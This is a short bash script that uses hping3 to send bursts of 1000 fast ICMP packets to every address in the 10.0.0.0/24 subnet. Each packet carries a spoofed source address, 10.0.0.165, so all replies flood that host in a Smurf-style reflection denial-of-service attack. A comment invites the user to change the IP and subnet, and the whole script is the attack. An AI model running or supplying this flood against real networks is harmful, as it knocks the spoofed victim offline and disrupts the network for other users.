#!/bin/bash

# change the ip/subnet
# 10.0.0.165 spoofed sorce 
for i in {1..255}
do
    hping3 -1 -c 1000 10.0.0.$i --fast -a 10.0.0.165 > /dev/null 2>&1 &
done
